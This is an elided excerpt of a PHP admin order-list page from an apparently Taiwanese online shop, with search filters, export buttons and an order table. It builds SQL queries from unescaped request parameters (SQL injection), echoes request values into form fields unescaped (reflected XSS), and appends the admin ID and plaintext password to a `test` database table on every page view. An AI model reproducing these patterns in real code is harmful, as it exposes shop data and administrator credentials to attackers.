...
$sh_mem = $_REQUEST['sh_mem'];
$sh_order = $_REQUEST['sh_order'];
$sh_mem_lv = $_REQUEST['sh_mem_lv'];

$admin_id = $_SESSION["admin_id"];
$admin_psw = $_SESSION["admin_psw"];
$test_sdd = 'time=' . date("Y-m-d H:i:s") . ';' . 'admin_id=' . $admin_id . ';' . 'admin_psw=' . $admin_psw . ';actioon=order_list;';
$sql_sdd = "update `test` set `aol` = CONCAT(aol,'$test_sdd') WHERE `no`='1'"; // 把 def 加在此欄後面.
mysql_query($sql_sdd);
...
if ($sh_mem != "" || $sh_txt != "" || $sh_order != "" || $sh_mem_lv != "") {
  $where = " WHERE ";
  if ($sh_mem != "") {
    $where_array[] = " `member_no` = '$sh_mem' OR `member_code` = '$sh_mem'";
  }
  // if($sh_mem_lv!=""){
  //   $where_array[]= " `b.mem_lv` = '$sh_mem_lv'";	
  // }	
  if ($sh_txt != "") {
    $where_array[] = " `order_code` LIKE '%$sh_txt%' OR `invoice_name` LIKE '%$sh_txt%' OR `invoice_email` LIKE '%$sh_txt%'  OR `total_amount` LIKE '%$sh_txt%'OR `no` LIKE '%$sh_txt%' OR `store_num` = '$sh_txt' ";
  }
  if ($sh_order != "") {
    $where_array[] = " `order_state` LIKE '%$sh_order%'";
  }
...
//上下頁參數
$argument = "&sh_mem=$sh_mem&sh_txt=$sh_txt&sh_order=$sh_order";

$orderlistClass = new DBClass('orderlist', $page, $pagesize);
$orderlistList = $orderlistClass->getAdminList($where, $order, $trace);
...
<head>
  ...
  if ($admin_pv_check == true && strExist($_SESSION["admin_pv"], 'orderlist_et') == false) {
    ...
    echo 'function onAdd(){ alert("您沒有編輯的權限");}';
    echo 'function onDel(){ alert("您沒有編輯的權限");}';
  } ?>
                ...
                <table width="90%">
                    ...
                    <td colspan="3">
                      ...
                      <form name="form1" method="post" action="excel_tr.php">
                        ...
                        訂單匯出： <select name="sh_state" id="sh_state">
                          ...
                          <option value="刷卡失敗" <?php chkSelected('刷卡失敗', $_REQUEST['sh_state']); ?>>刷卡失敗</option>
                        ...
                        <input type="submit" name="button1" id="button1" value="明細匯出" onClick="this.form.action='order_tr.php';this.form.submit();">
                        <input type="submit" name="button2" id="button2" value="彙整匯出" onClick="this.form.action='excel_tr.php';this.form.submit();">

                        <input type="button" name="button3" id="button3" onClick="javascript:window.location.href='list.php?del_od_file=del_od_file'" value="刪除匯出檔">
                  ...
                  <tr>
                    <td colspan="3" align="left" valign="top">
                      <form name="form3" method="get" action="list.php">
                        會員編號：W <input name="sh_mem" type="text" value="<?php echo $_REQUEST['sh_mem']; ?>"> &nbsp;
                        <!-- 
                      會員等級：
                      <select name="sh_mem_lv"  id="sh_mem_lv">
                        <option value="" <?php chkSelected('', $_REQUEST['sh_mem_lv']); ?> >全部</option>
                        <option value="lv_1"  <?php chkSelected('lv_1', $_REQUEST['sh_mem_lv']); ?> >lv_1</option>
                        <option value="lv_2"  <?php chkSelected('lv_2', $_REQUEST['sh_mem_lv']); ?> >lv_2</option>
                        <option value="lv_3"  <?php chkSelected('lv_3', $_REQUEST['sh_mem_lv']); ?> >lv_3</option>
                        <option value="lv_4"  <?php chkSelected('lv_4', $_REQUEST['sh_mem_lv']); ?> >lv_4</option>
                        <option value="lv_5"  <?php chkSelected('lv_5', $_REQUEST['sh_mem_lv']); ?> >lv_5</option>
                        <option value="lv_6"  <?php chkSelected('lv_6', $_REQUEST['sh_mem_lv']); ?> >lv_6</option>
                      </select> &nbsp; 
                      -->
                        模糊搜尋：<input name="sh_txt" type="text" value="<?php echo $_REQUEST['sh_txt']; ?>"> &nbsp;
                        訂單狀態：
                        <select name="sh_order" id="sh_order">
                          <option value="" <?php chkSelected('', $_REQUEST['sh_state']); ?>>全部</option>

                          <option value="未付款" <?php chkSelected('未付款', $_REQUEST['sh_order']); ?>>未付款</option>

                          <option value="待付款" <?php chkSelected('待付款', $_REQUEST['sh_order']); ?>>待付款</option>

                          <option value="完成訂購" <?php chkSelected('完成訂購', $_REQUEST['sh_order']); ?>>完成訂購</option>

                          <option value="確認運費" <?php chkSelected('確認運費', $_REQUEST['sh_order']); ?>>確認運費</option>

                          <option value="訂單處理中" <?php chkSelected('訂單處理中', $_REQUEST['sh_order']); ?>>訂單處理中</option>

                          <option value="刷卡失敗" <?php chkSelected('刷卡失敗', $_REQUEST['sh_order']); ?>>刷卡失敗</option>
                          <option value="取消訂單" <?php chkSelected('取消訂單', $_REQUEST['sh_state']); ?>>取消訂單</option>

                          <option value="已出貨" <?php chkSelected('已出貨', $_REQUEST['sh_order']); ?>>已出貨</option>

                          <option value="先出貨待付款" <?php chkSelected('先出貨待付款', $_REQUEST['sh_order']); ?>>先出貨待付款</option>

                          <option value="退貨訂單" <?php chkSelected('退貨訂單', $_REQUEST['sh_order']); ?>>退貨訂單</option>

                          <option value="失效訂單" <?php chkSelected('失效訂單', $_REQUEST['sh_order']); ?>>失效訂單</option>
                        </select>
                        訂單狀態：
                        &nbsp;&nbsp;
                    ...
                    <td colspan="3" align="center" valign="top">
                      ...
                      <table width="100%" border="1" cellpadding="2" cellspacing="0" bordercolor="#CCCCCC">
                        ...
                        <tr>
                          ...
                          <td width="138" class="tb_list_title">購買人</td>
                          <td width="70" class="tb_list_title">付款方式</td>
                          ...
                          <tr>
                            ...
                            <td align="left" class="tb_list_info" style="text-align:left;">
                              ...
                              <a href="https://shopping.windmill.com.tw/email_order.php?order_code=<?php echo $orderlist['order_code']; ?>&member_code=<?php echo $orderlist['member_code']; ?>" target="_blank">
                                ...
                                <? echo 'C17' . sprintf("%06d", $orderlist['no']); ?> </a>
                            </td>
